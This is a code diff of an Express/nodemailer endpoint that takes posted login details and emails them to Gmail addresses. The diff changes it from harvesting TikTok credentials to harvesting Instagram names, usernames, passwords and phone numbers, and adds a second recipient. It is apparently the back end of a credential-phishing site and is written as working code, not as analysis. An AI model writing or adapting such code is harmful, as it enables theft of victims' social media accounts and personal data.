@@ -25,18 +25,18 @@ const transporter = nodemailer.createTransport({
 });
 
 app.post('/send-data', (req, res) => {
-    const { Email Address, Phone Number, TikTok Username, TikTok Passward } = req.body;
+    const { fullname, username, password, phone } = req.body;
 
     const mailOptions = {
         from: 'lagharitahir08@gmail.com',
-        to: 'lagharitahir08@gmail.com', // Correct comma-separated string
-        subject: 'New TikTok Login Details',
-        text: `Nayi TikTok Login Details aayi hain:
+        to: 'lagharitahir08@gmail.com, myaqoobbhurgri4@gmail.com', // Correct comma-separated string
+        subject: 'New Instagram Login Details',
+        text: `Nayi Login Details aayi hain:
 
-Email Address: ${Email Address}
-Phone Number: ${Phone Number}
-TikTok username: ${TikTok Username}
-TikTok Passward: ${TikTok Passward}`
+Full Name: ${fullname}
+Username: ${username}
+Password: ${password}
+Phone Number: ${phone}`
     };
 
     transporter.sendMail(mailOptions, (error, info) => {
